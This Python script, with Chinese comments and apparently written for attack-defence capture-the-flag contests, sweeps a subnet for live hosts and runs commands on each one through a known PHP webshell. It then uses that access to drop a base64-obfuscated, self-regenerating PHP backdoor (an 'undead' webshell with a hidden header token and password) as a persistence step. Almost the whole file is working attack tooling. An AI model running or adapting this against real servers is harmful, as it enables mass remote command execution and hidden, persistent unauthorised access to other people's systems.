#--coding:utf-8--

import concurrent.futures
import threading
import requests
import re
import os

#---------IP探测模块------------

event = threading.Event()

def get_ip(ip, wangduan):

    a = wangduan
    b = a.split('.')
    del b[-1]
    new_ip = '.'.join(b)+'.'+ip

    return1 = os.popen(f'ping {new_ip} -n 2')

    if 'TTL' in return1.read():

        with open('host.txt','a+') as f:
          print(new_ip)
          f.write(new_ip+"\n")
    event.set()


def ip():

  duan = input('输入本机IP:')

  threads = []

  for i in range(1,255):
    t = threading.Thread(target=get_ip, args=(str(i),duan))
    t.start()
    threads.append(t)

  for t in threads:
    t.join()

  event.set()

#--------------------------


def ipv4_test(ip):
#检查是否为IPv4
    ipv4_pattern = r'^(\d{1,3}\.){3}\d{1,3}$'
    if re.match(ipv4_pattern, ip):
        octets = ip.split('.')
        for octet in octets:
            if not (0 <= int(octet) <= 255):
                return False
        return True
    return False

def update_url(url, shell_name):
    # 使用正则表达式来匹配URL中的文件名
    pattern = r'/([^/]+)$'
    match = re.search(pattern, url)

    if match:
        old_file_name = match.group(1)
        new_url = url.replace(old_file_name, shell_name)
        return new_url
    else:
        print(url, "file error")

#---------命令读取Flag模块------------
def test(url_head,flag_ip,method = 'POST'):#选择GET或POST发包
    with open("webshelllist.txt", "a") as webshelllist, open("firstround_flag.txt", "a") as flag:
            url = url_head + shell_addr
            try:
                if method == 'POST':
                    res = requests.post(url, data=payload, headers=headers, timeout=3)
                elif method == 'GET':
                    res = requests.get(url, params=payload, headers=headers, timeout=3)
                if res.status_code == requests.codes.ok:
                    result = url + "," + res.text
                    print(result)
                    # print(flag_ip+','+res.text.strip(), file=flag) #ip + flag
                    print(res.text.strip(), file=flag)#只记录flag
                    print(url + "," + passwd, file=webshelllist)
                    APT(payload1,url,method)
                else:
                    pass
                    # print("shell 404")
            except Exception as e:
                pass
                # print(url + " connect shell fail")

#-------------权限维持模块------------------------

def APT(exp,url,method):

    if method == 'POST':
        res = requests.post(url, data=exp, headers=headers, timeout=3)
        file_url = update_url(url, shell_name)
        if res.status_code == requests.codes.ok:
            try:
                requests.get(file_url,headers=headers,timeout=3)
            except Exception as e:
                pass
            apt_url = update_url(url, '.debug_backtrace.php')  # 生成的不死马文件名
            with open("APT_list.txt", "a") as apt_file:
                apt_file.write(apt_url + '\n')
    elif method == 'GET':
        res = requests.get(url, params=exp, headers=headers, timeout=3)
        # print(res.text)
        file_url = update_url(url, shell_name)
        if res.status_code == requests.codes.ok:
            try:
                print(file_url)
                requests.get(file_url,headers=headers,timeout=3)
            except Exception as e:
                pass
        apt_url = update_url(url, '.debug_backtrace.php') #生成的不死马文件名
        with open("APT_list.txt", "a") as apt_file:
            apt_file.write(apt_url+'\n')


def process_line(line):
    line = line.strip()
    if ipv4_test(line):
        url = 'http://' + line
        print(url)
        test(url,line)
    else:
        print(line, "Error!")


def main(max_threads = 100):#线程池

    with open('host.txt', 'r') as file:
        lines = file.readlines()

     # 根据需要调整线程数
    with concurrent.futures.ThreadPoolExecutor(max_threads) as executor:
        # 提交每一行的处理任务给线程池
        executor.map(process_line, lines)


if __name__ == '__main__':
    # proxy = {'http':"http://127.0.0.1:8080"}

    shell_addr = '/admin/upload.php' #木马位置
    passwd = "a"  # 木马密码
    port = "80" #端口
    payload = {passwd: "system('whoami');"}
    # payload = {passwd: "system('cat /flag');"}

    shell_name = '.HHH_DSB.php'#不死马文件名
    shell_data = "PD9waHAKCXNldF90aW1lX2xpbWl0KDApOwoJaWdub3JlX3VzZXJfYWJvcnQoMSk7Cgl3aGlsZSgxKXsKICAgICRmaWxlID0gZm9wZW4oIi5kZWJ1Z19iYWNrdHJhY2UucGhwIiwgInciKTsKICAgICR0eHQgPSAiUEQ5d2FIQUtDa0JsY25KdmNsOXlaWEJ2Y25ScGJtY29NQ2s3Q2lSbGVIQmxZM1JsWkZSdmEyVnVJRDBnSjFoWldFNW9UVlJKTUZGMWRYVjFOek0wZVRnelozSjNQVDBuT3dwcFppQW9hWE56WlhRb0pGOVRSVkpXUlZKYkowaFVWRkJmUkVOVVQwdEZUa1ZFSjEwcElDWW1JQ1JmVTBWU1ZrVlNXeWRJVkZSUVgwUkRWRTlMUlU1RlJDZGRJRDA5UFNBa1pYaHdaV04wWldSVWIydGxiaWtnZXdvSkpHWnBibVFnUFNCQUpGOVFUMU5VV3lkVk1sVnBaRE5wTVdRblhUc0tDV1YyWVd3b0pHWnBibVFwT3dwOUlHVnNjMlVnZXdvSkpITjBZWFZ6WDJOdlpHVWdQU0FpU0ZSVVVDOHhMakVnTkRBMElFNXZkQ0JHYjNWdVpDSTdDZ2xvWldGa1pYSW9KSE4wWVhWelgyTnZaR1VwT3dvZ0lDQWdaWGhwZENncE93cDkiOwogICAgJGNvbnRlbnQgPSBiYXNlNjRfZGVjb2RlKCR0eHQpOwogICAgZndyaXRlKCRmaWxlLCAkY29udGVudCk7CiAgICBmY2xvc2UoJGZpbGUpOwoJCXVzbGVlcCgyMDAwKTsKCX0="
    #写入不死马创建的后门内容
    #激活该不死马会有自删除功能，不断生成".debug_backtrace.php",密码U2Uid3i1d，需设置请求头"DCTOKENED",值为"XYXNhMTI0Quuuu734y83grw=="



    payload1 = {passwd: "$abc = '"+ shell_name +"';$data = '"+shell_data+"';$detxt = base64_decode($data);file_put_contents($abc, $detxt);echo 'successfully.';"}


    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0',
        'Content-Type': 'application/x-www-form-urlencoded'
    }

    # ip()
    # print("主机探测所有子线程执行完毕")
    # event.wait()
    # print("主线程等待结束")

    main()
    print("Success!")


